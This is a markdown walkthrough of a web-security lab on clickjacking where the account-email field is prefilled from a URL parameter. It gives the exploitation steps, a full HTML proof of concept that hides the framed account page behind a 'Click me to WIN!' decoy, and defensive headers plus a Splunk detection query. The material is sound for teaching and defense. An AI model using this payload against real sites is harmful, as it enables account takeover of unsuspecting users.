
# Lab Walkthrough: Clickjacking with Form Input Data Prefilled from a URL Parameter

* **Vulnerability Type:** Clickjacking (UI Redressing) / Parameter Injection
* **Target Context:** Client-Side Execution (Account Takeover via Email Update)
* **Skill Level:** Apprentice (Beginner)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Not Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]  
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](#1-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](#2-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](#3-step-by-step-exploitation-flow)
4. [Clickjacking Threat Amplification Comparison](#4-clickjacking-threat-amplification-comparison)
5. [Automated Exploitation Script (HTML PoC)](#5-automated-exploitation-script-html-poc)
6. [Defense, Hardening & Secure Coding](#6-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](#7-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](#8-troubleshooting--diagnostic-runbook)
9. [References & Standards](#9-references--standards)

---

## 1. Vulnerability Architecture & Mechanism

This vulnerability combines a lack of framing protection (Clickjacking) with insecure application logic that allows sensitive form fields to be pre-filled via HTTP GET parameters.

* **The Core Flaw:** The application takes values supplied in the URL query string (e.g., `?email=hacker@evil.com`) and automatically injects them into the `<input>` fields of the account settings form. 
* **The Synergy:** In standard clickjacking, tricking a user into clicking a button is easy, but forcing them to type a specific payload into an invisible text box is nearly impossible. Pre-filling the form via URL parameters removes the need for user typing, reducing a complex exploit down to a single, easily disguised click.
* **Real-World Analogy:** Imagine handing a victim a clipboard with a "Win a Prize" sign on top. Underneath the sign is a legal contract. Not only did you hide the contract, but you already *filled out the contract with your own terms in pen* before handing it to them. All they have to do is press their finger on the "Submit" spot.

```text
┌────────────────────────────────────────────────────────────────────────┐
│               PREFILLED CLICKJACKING EXECUTION FLOW                    │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker URL] [https://target.com/my-account?email=hacker@evil.com](https://target.com/my-account?email=hacker@evil.com)
           │
           ▼
  [2. Z-Index 2 (Invisible Iframe)] Target site loads, reads the URL, 
      and populates the email input field automatically.
           │
           ▼
  [3. Z-Index 1 (Decoy Page)] Attacker visually aligns a "Click Here!" 
      button exactly over the iframe's "Update Email" button.
           │
           ▼
  [4. Victim Action] Victim clicks the decoy button, physically clicking 
      the "Update Email" button on the pre-filled invisible iframe.

```

> **Learning Checkpoint 1:** Why doesn't the CSRF token block this? The CSRF token is tied to the form on the legitimate page. Because the victim is interacting directly with the native application (albeit invisibly), the browser submits the valid CSRF token perfectly, neutralizing anti-CSRF defenses.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The `/my-account` page and its URL parameter handling.
* **Primary Objective:** Frame the account page, prepopulate the email field using a URL query string, and align the "Update email" button under a decoy element.
* **Validation Signal:** The lab is solved when the exploit is delivered to the simulated victim and their account email is successfully updated to the attacker's email.

---

## 3. Step-by-Step Exploitation Flow

As an ethical hacker, precise alignment and parameter mapping are key. Follow this systematic approach:

* **Phase 1: Feature Mapping & URL Manipulation**
* Log into the target application with `wiener:peter`.
* Navigate to `/my-account`.
* Append `?email=hacker@evil.com` to the URL and hit Enter.
* *Observation:* The email input box is automatically populated with `hacker@evil.com`. This confirms the parameter injection vector.


* **Phase 2: CSS Alignment (The Calibration Phase)**
* Navigate to the **Exploit Server**.
* Construct the basic HTML structure, embedding the target URL *with* your payload parameter in the iframe `src`.
* **Crucial Step:** Set the iframe `opacity: 0.1` (partially visible).
* Adjust the `$top_value` (approx. `400px`) and `$side_value` (approx. `80px`) of the decoy `<div>` until the "Test me" text sits perfectly underneath the "Update email" button.
* Hover over "Test me" to ensure the cursor changes to a pointer (indicating the iframe button is registering the hover state).


* **Phase 3: Weaponization & Delivery**
* Once perfectly aligned, change the iframe opacity to `0.0001` (completely transparent).
* Change the decoy text from "Test me" to a compelling call-to-action ("Click me").
* Ensure the injected email address is unique and not currently registered to your account.
* Click **Store**, then **Deliver to victim**.



> **Learning Checkpoint 2:** Why is CSS `position: absolute` used for the decoy div and `position: relative` for the iframe? This creates a stacking context. Absolute positioning removes the div from the normal document flow, allowing it to float directly underneath the relative iframe based on exact pixel coordinates.

---

## 4. Clickjacking Threat Amplification Comparison

How does form prepopulation alter the threat model of a Clickjacking vulnerability?

| Scenario | Attacker Requirement | Exploit Complexity | Threat Severity |
| --- | --- | --- | --- |
| **Standard Clickjacking (State change only)** | Victim must click a specific static button (e.g., "Delete Account"). | Low | High (Data Loss) |
| **Clickjacking requiring text input** | Victim must unknowingly type a specific attacker string *then* click submit. | Extremely High | Low (Impractical) |
| **Clickjacking + URL Prepopulation** | Victim clicks once; attacker pre-loads the payload via URL. | Low | **Critical** (Account Takeover) |

---

## 5. Automated Exploitation Script (HTML PoC)

This is the finalized HTML payload required to solve the lab. Replace `YOUR-LAB-ID` with your active lab instance and update the alignment pixels based on your screen calibration.

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        /* The Target Application (Invisible but clickable) */
        iframe {
            position: relative;
            width: 700px;
            height: 500px;
            opacity: 0.0001; /* Mathematically transparent, actively clickable */
            z-index: 2;      /* Top layer */
        }
        
        /* The Attacker's Decoy Element (Visible but unclickable) */
        div {
            position: absolute;
            top: 400px;      /* Calibrated Y-axis alignment */
            left: 80px;      /* Calibrated X-axis alignment */
            z-index: 1;      /* Bottom layer */
            font-size: 22px;
            color: #ffffff;
            background-color: #e74c3c;
            padding: 10px 20px;
            border-radius: 5px;
            font-family: Arial, sans-serif;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <!-- Decoy action designed to look like a generic game/button -->
    <div>Click me to WIN!</div>
    
    <!-- Target framed site WITH the prepopulated email payload -->
    <iframe src="[https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com](https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com)"></iframe>
</body>
</html>

```

---

## 6. Defense, Hardening & Secure Coding

Neutralizing this vulnerability requires severing the ability to frame the application, which nullifies the attack regardless of how the form is populated.

* **Content Security Policy (CSP) - Primary Defense:**
* Implement the `frame-ancestors` directive on all HTML responses.
* *Secure Configuration:* `Content-Security-Policy: frame-ancestors 'none';` (Blocks all framing) or `frame-ancestors 'self';` (Allows framing only on the same domain).


* **X-Frame-Options (XFO) - Legacy/Defense in Depth:**
* *Secure Configuration:* `X-Frame-Options: DENY` or `X-Frame-Options: SAMEORIGIN`.


* **State Management (Secondary Defense):**
* Avoid prepopulating highly sensitive, state-changing form fields (like Email, Password, or Transfer Amounts) directly from `GET` URL parameters. If URL parameters must dictate state, require an out-of-band confirmation (e.g., entering the current password) to finalize the change.



---

## 7. SIEM Detection & Telemetry Analysis

Detecting prefilled clickjacking requires correlating `GET` parameters with cross-origin referers.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined method=GET uri_path="/my-account"
| search uri_query="*email=*" 
| eval is_external_referer=if(match(referer, "^https?://(www\.)?trusted-domain\.com"), "No", "Yes")
| stats count by src_ip, uri_path, uri_query, referer
| where is_external_referer="Yes" AND count > 0

```

*Note:* Attackers can mask the `Referer` using `rel="noreferrer"`, making framing headers the only reliable enforcement mechanism.

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Iframe refuses to load (Blank screen)** | Target implemented `X-Frame-Options` or `CSP`. | Verify headers in Burp Suite intercept. If testing a real site, framing is blocked. |
| **Email doesn't change when testing locally** | Misalignment or missing parameter. | Ensure your iframe `src` explicitly includes `?email=...`. Ensure `opacity: 0.1` verifies the decoy is exactly over the button. |
| **Exploit works locally but lab fails to solve** | Victim browser differences. | The simulated victim's browser window might render differently. Tweak the `$top_value` up or down by 10-20 pixels and resubmit. |

---

## 9. References & Standards

* [OWASP: Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html?utm_source=gemini)
* [Mozilla Developer Network (MDN): Content-Security-Policy: frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors?utm_source=gemini)
* [MITRE ATT&CK: T1056.003 - Input Capture: Web Portal Capture](https://attack.mitre.org/techniques/T1056/003/?utm_source=gemini)

```

> **Key Insight:** Clickjacking relies on exploiting the user's physical interaction with the DOM. When an application allows sensitive state vectors to be defined via URL parameters, it acts as a force multiplier for clickjacking—transforming a vulnerability that traditionally only triggers static clicks into a dynamic, data-injecting exploit vector capable of full account takeover.

<FollowUp label="Want to learn how attackers chain Clickjacking with DOM XSS?" query="Explain how attackers chain a Clickjacking vulnerability with a DOM XSS vulnerability to achieve silent JavaScript execution, including real-world scenarios."/>

```
